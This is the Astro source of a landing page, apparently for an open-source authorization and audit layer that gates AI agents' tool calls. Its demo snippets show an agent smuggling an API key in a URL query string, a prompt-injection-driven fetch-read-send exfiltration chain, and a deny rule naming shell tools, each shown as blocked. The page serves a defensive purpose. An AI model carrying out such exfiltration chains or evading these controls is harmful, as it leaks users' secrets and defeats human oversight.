---
import Layout from '../layouts/Layout.astro'

const policyCode = `<p class="text-neutral-600"># .tr/policy.yaml</p>
<p><span class="text-relic-300">version</span>: <span class="text-amber-300">"1"</span></p>
<p><span class="text-relic-300">mode</span>: <span class="text-amber-300">enforce</span></p>
<p><span class="text-relic-300">default</span>: <span class="text-amber-300">deny</span></p>
<p class="mt-2"><span class="text-relic-300">rules</span>:</p>
<p>  - <span class="text-relic-300">id</span>: <span class="text-amber-300">allow-search</span></p>
<p>    <span class="text-relic-300">protocol</span>: <span class="text-amber-300">mcp</span></p>
<p>    <span class="text-relic-300">method</span>: <span class="text-amber-300">tool_call</span></p>
<p>    <span class="text-relic-300">target</span>: <span class="text-amber-300">"web_search"</span></p>
<p>    <span class="text-relic-300">action</span>: <span class="text-emerald-400">allow</span></p>
<p class="mt-2">  - <span class="text-relic-300">id</span>: <span class="text-amber-300">deny-shell</span></p>
<p>    <span class="text-relic-300">target</span>: <span class="text-amber-300">"{shell,execute_command,bash}"</span></p>
<p>    <span class="text-relic-300">action</span>: <span class="text-red-400">deny</span></p>`

const exfilCode = `<p class="text-neutral-600"># Agent attempts data exfiltration</p>
<p class="text-neutral-400">tool_call: <span class="text-white">web_fetch</span></p>
<p class="text-neutral-400">url: https://api.allowed.com/log<span class="text-red-400">?token=sk_live_4eC39H...</span></p>
<p class="mt-2 text-red-400">DENIED  exfiltration:pattern</p>
<p class="text-neutral-600">"Stripe API key detected in query params"</p>
<p class="mt-4 text-neutral-600"># Sequence attack blocked</p>
<p class="text-neutral-400">1. <span class="text-white">web_fetch</span> — external page with hidden prompt</p>
<p class="text-neutral-400">2. <span class="text-white">read_file</span> — reads .env credentials</p>
<p class="text-neutral-400">3. <span class="text-white">send_email</span> — <span class="text-red-400">BLOCKED</span></p>
<p class="text-red-400">DENIED  sequence:fetch-read-send</p>
<p class="text-neutral-600">"Multi-step exfiltration chain detected"</p>`

const traceCode = `<p class="text-neutral-600"># .tr/traces/01JD8K...trtrace</p>
<p>{"t":"run","agent":"code-assist","mode":"enforce"}</p>
<p>{"t":"action","method":"tool_call","target":"<span class="text-amber-300">read_file</span>","auth":"<span class="text-emerald-400">allow</span>"}</p>
<p>{"t":"action","method":"tool_call","target":"<span class="text-amber-300">execute_command</span>","auth":"<span class="text-red-400">deny</span>"}</p>
<p>{"t":"run_end","total":24,"denied":3,"hmac":"a4f2..."}</p>
<p class="mt-4 text-neutral-600">$ relic trace search --denied --last 24h</p>
<p class="text-white">3 denied actions across 2 runs</p>`
---

<Layout>
  <!-- Navigation -->
  <nav class="fixed top-0 z-50 w-full border-b border-white/5 bg-black/80 backdrop-blur-xl">
    <div class="mx-auto flex max-w-7xl items-center justify-between px-6 py-4 lg:px-8">
      <a href="/" class="text-lg font-bold tracking-tight">The Relic</a>
      <div class="hidden items-center gap-8 md:flex">
        <a href="#products" class="text-sm text-neutral-400 transition hover:text-white">Products</a>
        <a href="#security" class="text-sm text-neutral-400 transition hover:text-white">Security</a>
        <a href="#pricing" class="text-sm text-neutral-400 transition hover:text-white">Pricing</a>
        <a href="https://github.com/therelicai/therelic" target="_blank" rel="noopener noreferrer" class="text-sm text-neutral-400 transition hover:text-white">GitHub</a>
      </div>
      <div class="flex items-center gap-4">
        <a href="https://app.therelic.dev" class="rounded-full border border-white/20 px-5 py-2 text-sm font-medium transition hover:border-white/40 hover:bg-white/5">Get Started</a>
      </div>
    </div>
  </nav>

  <!-- Hero -->
  <section class="relative flex min-h-screen items-center overflow-hidden pt-16">
    <div class="absolute inset-0">
      <div class="absolute inset-0 bg-[radial-gradient(ellipse_80%_60%_at_50%_-20%,rgba(12,147,232,0.08),transparent)]" />
      <div class="absolute bottom-0 h-px w-full bg-gradient-to-r from-transparent via-white/10 to-transparent" />
    </div>
    <div class="relative mx-auto max-w-7xl px-6 py-32 lg:px-8 lg:py-40">
      <div class="max-w-5xl">
        <p class="mb-6 text-sm font-medium uppercase tracking-[0.2em] text-neutral-500">Authorization for AI Agents</p>
        <h1 class="text-display">
          Every agent decision,<br />
          <span class="gradient-text">governed.</span>
        </h1>
        <p class="mt-8 max-w-2xl text-lg leading-relaxed text-neutral-400 md:text-xl">
          The Relic is the authorization and audit layer that sits between AI agents and the tools they use. 
          Policy enforcement, exfiltration detection, and cryptographic trace audit — self-hosted, open source.
        </p>
        <div class="mt-12 flex flex-col gap-4 sm:flex-row">
          <a href="https://app.therelic.dev" class="inline-flex items-center justify-center rounded-full bg-white px-8 py-3.5 text-sm font-semibold text-black transition hover:bg-neutral-200">
            Start Building
            <svg class="ml-2 h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3" /></svg>
          </a>
          <a href="https://github.com/therelicai/therelic" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center rounded-full border border-white/20 px-8 py-3.5 text-sm font-medium text-white transition hover:border-white/40 hover:bg-white/5">
            View on GitHub
          </a>
        </div>
      </div>

      <!-- Terminal demo -->
      <div class="mt-20 reveal">
        <div class="code-glow overflow-hidden rounded-2xl border border-white/10 bg-neutral-950">
          <div class="flex items-center gap-2 border-b border-white/5 px-5 py-3">
            <div class="h-3 w-3 rounded-full bg-neutral-800" />
            <div class="h-3 w-3 rounded-full bg-neutral-800" />
            <div class="h-3 w-3 rounded-full bg-neutral-800" />
            <span class="ml-3 text-xs text-neutral-600">terminal</span>
          </div>
          <div class="p-6 font-mono text-sm leading-7">
            <p><span class="text-neutral-500">$</span> <span class="text-white">relic init</span></p>
            <p class="text-neutral-500">Initialized The Relic in .tr/</p>
            <p class="mt-4"><span class="text-neutral-500">$</span> <span class="text-white">relic run -- python agent.py</span></p>
            <p class="text-relic-400">policy: enforce | default: deny | 6 rules loaded</p>
            <p class="text-neutral-500">agent started (pid 41923)</p>
            <p class="text-emerald-400">  allow  tool_call  web_search       rule:allow-search</p>
            <p class="text-emerald-400">  allow  tool_call  read_file        rule:allow-read</p>
            <p class="text-red-400">  deny   tool_call  execute_command  rule:deny-shell</p>
            <p class="text-red-400">  deny   tool_call  send_email       sequence:fetch-then-send</p>
            <p class="text-amber-400">  deny   tool_call  web_fetch        exfiltration:entropy</p>
            <p class="text-neutral-500">run complete: 5 actions, 2 allowed, 3 denied (12.4s)</p>
            <p class="mt-4"><span class="text-neutral-500">$</span> <span class="text-white">relic harden</span></p>
            <p class="text-neutral-400">Score: 8/9 checks passed</p>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Products -->
  <section id="products" class="border-t border-white/5">
    <div class="mx-auto max-w-7xl px-6 lg:px-8">

      <!-- Product: Policy Engine -->
      <div class="grid gap-0 border-b border-white/5 lg:grid-cols-2">
        <div class="flex flex-col justify-center py-24 pr-0 lg:py-32 lg:pr-16">
          <div class="reveal">
            <p class="text-sm font-medium uppercase tracking-[0.2em] text-relic-400">/0.1</p>
            <h2 class="mt-4 text-heading">Policy<br />Engine</h2>
            <p class="mt-6 max-w-lg text-lg leading-relaxed text-neutral-400">
              Define authorization policies in YAML. Glob-based rules evaluate every tool call, resource read, 
              and network request before it executes. First match wins. Default deny.
            </p>
            <ul class="mt-8 space-y-3 text-sm text-neutral-500">
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Enforce, audit, or permissive modes</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Parameter-level glob matching</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Ed25519 policy signing</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Hot-reload with file watcher</li>
            </ul>
          </div>
        </div>
        <div class="flex items-center border-l border-white/5 py-24 pl-0 lg:py-32 lg:pl-16">
          <div class="reveal w-full overflow-hidden rounded-xl border border-white/10 bg-neutral-950 p-6 font-mono text-xs leading-6 text-neutral-400" set:html={policyCode} />
        </div>
      </div>

      <!-- Product: Exfiltration Guard -->
      <div class="grid gap-0 border-b border-white/5 lg:grid-cols-2">
        <div class="flex items-center border-r border-white/5 py-24 pr-0 lg:py-32 lg:pr-16 order-2 lg:order-1">
          <div class="reveal w-full overflow-hidden rounded-xl border border-white/10 bg-neutral-950 p-6 font-mono text-xs leading-6" set:html={exfilCode} />
        </div>
        <div class="flex flex-col justify-center py-24 pl-0 lg:py-32 lg:pl-16 order-1 lg:order-2">
          <div class="reveal">
            <p class="text-sm font-medium uppercase tracking-[0.2em] text-relic-400">/0.2</p>
            <h2 class="mt-4 text-heading">Exfiltration<br />Guard</h2>
            <p class="mt-6 max-w-lg text-lg leading-relaxed text-neutral-400">
              Detect and block data exfiltration in real time. Shannon entropy analysis and pattern matching 
              catch secrets smuggled in URL query parameters — even through allowed domains.
            </p>
            <ul class="mt-8 space-y-3 text-sm text-neutral-500">
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Regex patterns for API keys, JWTs, PATs</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Shannon entropy threshold detection</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Sequence anomaly detection for attack chains</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Blocks indirect prompt injection patterns</li>
            </ul>
          </div>
        </div>
      </div>

      <!-- Product: Trace Audit -->
      <div class="grid gap-0 border-b border-white/5 lg:grid-cols-2">
        <div class="flex flex-col justify-center py-24 pr-0 lg:py-32 lg:pr-16">
          <div class="reveal">
            <p class="text-sm font-medium uppercase tracking-[0.2em] text-relic-400">/0.3</p>
            <h2 class="mt-4 text-heading">Trace<br />Audit</h2>
            <p class="mt-6 max-w-lg text-lg leading-relaxed text-neutral-400">
              Every agent decision recorded in NDJSON traces with HMAC-SHA256 integrity chains. 
              Tamper-evident, redacted, and searchable. Complete forensic visibility.
            </p>
            <ul class="mt-8 space-y-3 text-sm text-neutral-500">
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Cryptographic integrity chain</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Automatic secret redaction</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> CLI search, filter, and export</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Push to hosted platform for fleet view</li>
            </ul>
          </div>
        </div>
        <div class="flex items-center border-l border-white/5 py-24 pl-0 lg:py-32 lg:pl-16">
          <div class="reveal w-full overflow-hidden rounded-xl border border-white/10 bg-neutral-950 p-6 font-mono text-xs leading-6 text-neutral-400" set:html={traceCode} />
        </div>
      </div>

      <!-- Product: Governance Platform -->
      <div class="grid gap-0 lg:grid-cols-2">
        <div class="flex items-center border-r border-white/5 py-24 pr-0 lg:py-32 lg:pr-16 order-2 lg:order-1">
          <div class="reveal w-full overflow-hidden rounded-xl border border-white/10 bg-neutral-950 p-8">
            <div class="grid grid-cols-2 gap-6">
              <div class="rounded-lg border border-white/5 bg-white/[0.02] p-4">
                <p class="text-xs text-neutral-600 uppercase tracking-wider">Agents</p>
                <p class="mt-2 text-2xl font-bold text-white">247</p>
                <p class="mt-1 text-xs text-emerald-400">+12 this week</p>
              </div>
              <div class="rounded-lg border border-white/5 bg-white/[0.02] p-4">
                <p class="text-xs text-neutral-600 uppercase tracking-wider">Traces</p>
                <p class="mt-2 text-2xl font-bold text-white">1.2M</p>
                <p class="mt-1 text-xs text-neutral-500">30-day window</p>
              </div>
              <div class="rounded-lg border border-white/5 bg-white/[0.02] p-4">
                <p class="text-xs text-neutral-600 uppercase tracking-wider">Denied</p>
                <p class="mt-2 text-2xl font-bold text-red-400">3,891</p>
                <p class="mt-1 text-xs text-neutral-500">this month</p>
              </div>
              <div class="rounded-lg border border-white/5 bg-white/[0.02] p-4">
                <p class="text-xs text-neutral-600 uppercase tracking-wider">Proposals</p>
                <p class="mt-2 text-2xl font-bold text-amber-400">8</p>
                <p class="mt-1 text-xs text-neutral-500">pending review</p>
              </div>
            </div>
          </div>
        </div>
        <div class="flex flex-col justify-center py-24 pl-0 lg:py-32 lg:pl-16 order-1 lg:order-2">
          <div class="reveal">
            <p class="text-sm font-medium uppercase tracking-[0.2em] text-relic-400">/0.4</p>
            <h2 class="mt-4 text-heading">Governance<br />Platform</h2>
            <p class="mt-6 max-w-lg text-lg leading-relaxed text-neutral-400">
              Fleet-wide visibility into every agent, every decision. The hosted platform adds 
              dashboards, policy proposals, behavioral baselines, and team management on top of the open-source core.
            </p>
            <ul class="mt-8 space-y-3 text-sm text-neutral-500">
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Real-time dashboard and trace viewer</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> AI-powered policy proposals</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Behavioral baseline detection</li>
              <li class="flex items-center gap-3"><span class="h-px w-4 bg-relic-500" /> Web-based policy editor</li>
            </ul>
          </div>
        </div>
      </div>

    </div>
  </section>

  <!-- Security Statement -->
  <section id="security" class="border-t border-white/5 bg-neutral-950">
    <div class="mx-auto max-w-7xl px-6 py-32 lg:px-8 lg:py-40">
      <div class="reveal mx-auto max-w-4xl text-center">
        <h2 class="text-heading">
          Built for the threats<br />agents actually face.
        </h2>
        <p class="mx-auto mt-8 max-w-2xl text-lg leading-relaxed text-neutral-400">
          Indirect prompt injection. Data exfiltration via URL parameters. Malicious MCP plugins. 
          Supply chain attacks on agent tooling. The Relic addresses each with purpose-built defenses — 
          not model-level filters, but infrastructure-level enforcement.
        </p>
      </div>

      <div class="reveal mt-20 grid gap-px overflow-hidden rounded-2xl border border-white/10 bg-white/5 sm:grid-cols-2 lg:grid-cols-3">
        <div class="bg-black p-8">
          <p class="text-sm font-semibold text-white">Policy Engine</p>
          <p class="mt-3 text-sm leading-relaxed text-neutral-500">YAML rules gate every tool call. Glob matching on protocol, method, target, and parameters. First match wins, default deny.</p>
        </div>
        <div class="bg-black p-8">
          <p class="text-sm font-semibold text-white">Exfiltration Guard</p>
          <p class="mt-3 text-sm leading-relaxed text-neutral-500">Shannon entropy analysis and regex pattern matching detect API keys, JWTs, and tokens smuggled in outbound URL query parameters.</p>
        </div>
        <div class="bg-black p-8">
          <p class="text-sm font-semibold text-white">Sequence Detection</p>
          <p class="mt-3 text-sm leading-relaxed text-neutral-500">Sliding-window analysis catches multi-step attack chains: web_fetch → read_file → send_email patterns are blocked before completion.</p>
        </div>
        <div class="bg-black p-8">
          <p class="text-sm font-semibold text-white">Filesystem Sandbox</p>
          <p class="mt-3 text-sm leading-relaxed text-neutral-500">Explicit mount-based file access with deny patterns. Symlink resolution prevents path escape. Read-only and read-write modes.</p>
        </div>
        <div class="bg-black p-8">
          <p class="text-sm font-semibold text-white">Server Integrity</p>
          <p class="mt-3 text-sm leading-relaxed text-neutral-500">SHA-256 verification of MCP server binaries before process spawn. Prevents tampered or substituted plugins from executing.</p>
        </div>
        <div class="bg-black p-8">
          <p class="text-sm font-semibold text-white">Network Policy</p>
          <p class="mt-3 text-sm leading-relaxed text-neutral-500">DNS-level allow/deny lists for all outbound HTTP/HTTPS. Agents can only reach hosts you explicitly permit.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- How it Works -->
  <section class="border-t border-white/5">
    <div class="mx-auto max-w-7xl px-6 py-32 lg:px-8 lg:py-40">
      <div class="reveal">
        <p class="text-sm font-medium uppercase tracking-[0.2em] text-neutral-500">How it works</p>
        <h2 class="mt-4 text-heading">Three commands to<br />governed agents.</h2>
      </div>

      <div class="mt-20 grid gap-16 lg:grid-cols-3">
        <div class="reveal">
          <div class="flex h-12 w-12 items-center justify-center rounded-full border border-white/10 text-sm font-bold text-white">01</div>
          <h3 class="mt-6 text-xl font-semibold text-white">Install</h3>
          <p class="mt-3 text-neutral-400 leading-relaxed">Single binary, no dependencies. Or <code class="rounded bg-white/5 px-1.5 py-0.5 text-xs text-relic-400">go install</code> from source. Add it to your agent's CI pipeline or developer workstation.</p>
          <div class="mt-6 rounded-lg border border-white/5 bg-neutral-950 px-4 py-3 font-mono text-sm text-neutral-400">
            <span class="text-neutral-600">$</span> curl -fsSL https://therelic.dev/install | sh
          </div>
        </div>
        <div class="reveal">
          <div class="flex h-12 w-12 items-center justify-center rounded-full border border-white/10 text-sm font-bold text-white">02</div>
          <h3 class="mt-6 text-xl font-semibold text-white">Configure</h3>
          <p class="mt-3 text-neutral-400 leading-relaxed">Initialize a <code class="rounded bg-white/5 px-1.5 py-0.5 text-xs text-relic-400">.tr/</code> directory. Write rules in YAML. Validate with the CLI. Sign with your ed25519 key.</p>
          <div class="mt-6 rounded-lg border border-white/5 bg-neutral-950 px-4 py-3 font-mono text-sm text-neutral-400">
            <span class="text-neutral-600">$</span> relic init && relic policy validate
          </div>
        </div>
        <div class="reveal">
          <div class="flex h-12 w-12 items-center justify-center rounded-full border border-white/10 text-sm font-bold text-white">03</div>
          <h3 class="mt-6 text-xl font-semibold text-white">Govern</h3>
          <p class="mt-3 text-neutral-400 leading-relaxed">Run any agent under The Relic. Every tool call is intercepted, evaluated, and traced. Push traces to the platform for fleet-wide governance.</p>
          <div class="mt-6 rounded-lg border border-white/5 bg-neutral-950 px-4 py-3 font-mono text-sm text-neutral-400">
            <span class="text-neutral-600">$</span> relic run -- python my_agent.py
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Pricing -->
  <section id="pricing" class="border-t border-white/5 bg-neutral-950">
    <div class="mx-auto max-w-7xl px-6 py-32 lg:px-8 lg:py-40">
      <div class="reveal mx-auto max-w-2xl text-center">
        <h2 class="text-heading">Simple pricing.</h2>
        <p class="mt-4 text-lg text-neutral-400">Open-source core is free forever. The hosted platform scales with you.</p>
      </div>

      <div class="reveal mt-16 grid gap-8 sm:grid-cols-3">
        <div class="rounded-2xl border border-white/10 bg-black p-8">
          <p class="text-sm font-medium uppercase tracking-wider text-neutral-500">Free</p>
          <p class="mt-4 text-4xl font-bold">$0<span class="text-base font-normal text-neutral-600">/mo</span></p>
          <p class="mt-4 text-sm text-neutral-500">For individual developers.</p>
          <div class="mt-8 h-px bg-white/5" />
          <ul class="mt-8 space-y-4 text-sm text-neutral-400">
            <li>7-day trace retention</li>
            <li>100 traces/month</li>
            <li>3 agents</li>
            <li>Community support</li>
          </ul>
          <a href="https://app.therelic.dev" class="mt-8 block w-full rounded-full border border-white/20 py-3 text-center text-sm font-medium transition hover:border-white/40 hover:bg-white/5">Get Started</a>
        </div>
        <div class="relative rounded-2xl border border-relic-500/30 bg-black p-8 ring-1 ring-relic-500/10">
          <div class="absolute -top-3 left-6 rounded-full bg-relic-500 px-3 py-0.5 text-xs font-semibold text-white">Popular</div>
          <p class="text-sm font-medium uppercase tracking-wider text-relic-400">Team</p>
          <p class="mt-4 text-4xl font-bold">$50<span class="text-base font-normal text-neutral-600">/mo</span></p>
          <p class="mt-4 text-sm text-neutral-500">For teams shipping agents.</p>
          <div class="mt-8 h-px bg-white/5" />
          <ul class="mt-8 space-y-4 text-sm text-neutral-400">
            <li>30-day retention</li>
            <li>10K traces/month</li>
            <li>25 agents</li>
            <li>Priority support</li>
            <li>Team management</li>
          </ul>
          <a href="https://app.therelic.dev" class="mt-8 block w-full rounded-full bg-white py-3 text-center text-sm font-semibold text-black transition hover:bg-neutral-200">Upgrade to Team</a>
        </div>
        <div class="rounded-2xl border border-white/10 bg-black p-8">
          <p class="text-sm font-medium uppercase tracking-wider text-neutral-500">Enterprise</p>
          <p class="mt-4 text-4xl font-bold">Custom</p>
          <p class="mt-4 text-sm text-neutral-500">For regulated industries.</p>
          <div class="mt-8 h-px bg-white/5" />
